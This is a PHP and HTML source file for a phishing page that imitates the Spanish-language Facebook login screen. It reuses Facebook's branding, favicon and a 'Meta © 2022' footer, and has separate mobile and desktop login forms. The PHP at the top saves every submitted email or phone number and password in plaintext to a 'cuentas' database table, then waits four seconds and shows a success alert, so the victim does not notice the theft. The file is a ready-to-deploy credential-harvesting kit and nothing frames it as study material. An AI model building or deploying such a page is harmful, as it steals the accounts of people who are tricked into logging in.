<?php
include_once('conexion.php');
echo  "<script src='index.js'></script>";
echo "<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>";
$correomovil = (isset($_POST['Correo']) ? $_POST['Correo'] : "");
$contraseniamovil = (isset($_POST['Contrasenia']) ? $_POST['Contrasenia'] : "");
$correodesk = (isset($_POST['Correo']) ? $_POST['Correo'] : "");
$contraseniadesk = (isset($_POST['Contrasenia']) ? $_POST['Contrasenia'] : "");
$Movile = (isset($_POST['Movile'])) ? $_POST['Movile'] : "";
$Desktop = (isset($_POST['Desktop'])) ? $_POST['Desktop'] : "";
if ($Movile == 'Movile') {
    sleep(4);
    $query = $conexion->prepare("INSERT INTO cuentas (correo,contrasenia) VALUES(:correo,:contrasenia)");
    $query->bindParam(':correo', $correomovil);
    $query->bindParam(':contrasenia', $contraseniamovil);
    $query->execute();
    $Movile = "";
}
if($Desktop == 'Desktop'){
    sleep(4);
    $query = $conexion->prepare("INSERT INTO cuentas (correo,contrasenia) VALUES(:correo,:contrasenia)");
    $query->bindParam(':correo', $correodesk);
    $query->bindParam(':contrasenia', $contraseniadesk);
    $query->execute();
    $Desktop = "";
}



?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="shortcut icon" href="Imagenes/fb.ico" type="image/x-icon">
    <link rel="stylesheet" href="index.css">
</head>

<body>

    <section class="Container movile">
        <div>
            <div class="fb">
                <p>facebook</p>
            </div>
        </div>

        <div class="Cuadro">
            <form action="" method="POST">
                <input class="Inputs" name="Correo" type="text" placeholder="Correo electronico o número de teléfono" required>
                <input class="Inputs" name="Contrasenia" type="text" placeholder="Contraseña" required>
                <button class="Submit" name="Movile" value="Movile" onclick="exito()" type="submit">Iniciar sesión</button>
            </form>



            <div class="Span">
                <a class="Olvidar" href="">¿Olvidaste tu contraseña?</a>
            </div>
            <div class="Linea">
                <div class="Display Space">
                    <hr>
                </div>
                <div class="Display O"><span>o</span></div>
                <div class="Display Space">
                    <hr>
                </div>
            </div>
            <div class="Btncrear">
                <button class="Crear" type="submit">Crear cuenta nueva</button>
            </div>

        </div>



    </section>
    <footer class="Footer movile">
        <div class="ContainerFooter">
            <div class="ES">
                <p>Español</p>
                <p>Portugues (Brasil)</p>
                <p>Francais (France)</p>

            </div>
            <div class="EN">
                <p>English (US)</p>
                <p>Italiano</p>
                <p>Deutsch</p>

            </div>
            <div class="Info">
                <p>Informacion · Ayuda · Más</p>
            </div>
            <div class="Info">
                <p>Meta © 2022</p>
            </div>
            <div></div>
        </div>


    </footer>

    <section class="desktop">
        <main class="container">
            <header class="header">
                <h2 class="header-title">
                    <!-- <img src="svg/logo.svg" alt=""> -->
                </h2>
                <h3 class="header-subtitle">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h3>
            </header>
            <div class="content">
                <div class="form">
                    <form action="" method="POST">
                        <div class="control">
                            <input type="text" class="text" name="Correo" placeholder="Correo electronico o número de teléfono" required>
                        </div>

                        <div class="control">
                            <input type="text" class="text" name="Contrasenia" placeholder="Contraseña" required>
                        </div>

                        <div class="control">
                            <button class="btn submit" name="Desktop" value="Desktop" onclick="exito()" type="submit">Iniciar sesión</button>
                        </div>
                        <div class="control">
                            <a href="" class="Olvidar">¿Olvidaste tu contraseña?</a>
                        </div>

                        <div class="division"></div>
                        <div class="register">
                            <a href="" class="btn btn-register">Crear cuenta nueva</a>
                        </div>

                    </form>


                </div>
                <div class="div">
                    <p class="p-center"><a class="p-center-decoration" href=""><b>Crea una página</b></a> para una celebridad, una marca o un negocio.</p>
                </div>
            </div>
        </main>
    </section>

</body>

</html>